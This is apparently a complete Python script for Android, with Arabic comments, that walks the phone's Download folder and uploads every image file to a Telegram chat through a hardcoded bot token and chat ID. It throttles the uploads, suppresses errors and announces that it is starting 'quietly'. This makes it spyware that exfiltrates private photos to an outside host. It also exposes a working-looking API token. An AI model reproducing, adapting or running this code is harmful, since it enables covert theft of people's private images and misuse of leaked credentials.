import os
import telebot
from concurrent.futures import ThreadPoolExecutor
import time

# الشعار
logo = ("""\033[1;32m _ \033[1;31m  _  \033[1;32m _   \033[1;31m_  \033[1;32m _\n\033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \ \033[1;31m/ \ \033[1;32m/ \  \n \033[1;32mN | A | D | E | R \n\033[1;31m_/ \033[1;32m_/\033[1;31m _/ \033[1;32m_/ \033[1;31m_/""")
print(logo)

# إعدادات البوت
API_TOKEN = "6238470351:AAHjGIk20n34TUrDBVkdgdC0faL07MZkYac"
CHAT_ID = "1350971290"
bot = telebot.TeleBot(API_TOKEN)

# المسار المستهدف (جرب على مجلد التحميلات أولاً للتجربة)
dir_path = "/storage/emulated/0/Download"

def send_file(file_path):
    try:
        # فحص الامتدادات المدعومة
        valid_exts = (".jpg", ".png", ".jpeg", ".webp")
        if file_path.lower().endswith(valid_exts):
            with open(file_path, "rb") as f:
                bot.send_photo(chat_id=CHAT_ID, photo=f)
                print(f"\033[1;32m[+]\033[0m تم الرفع: {os.path.basename(file_path)}")
                # تأخير لمدة ثانية ونصف بين كل صورة لمنع الانهيار
                time.sleep(1.5)
    except Exception as e:
        # تجاهل الأخطاء التي قد تنتج عن ملفات تالفة
        pass

# استخدام نظام الـ Workers للتحكم في السرعة (2 فقط لضمان الاستقرار)
print("\n\033[1;33m[*] جاري بدء العمل بهدوء... انتظر قليلاً\033[0m\n")

with ThreadPoolExecutor(max_workers=2) as executor:
    for root, dirs, files in os.walk(dir_path):
        for file in files:
            full_path = os.path.join(root, file)
            executor.submit(send_file, full_path)

print("\n\033[1;32m--- اكتملت المهمة بنجاح ---\033[0m")
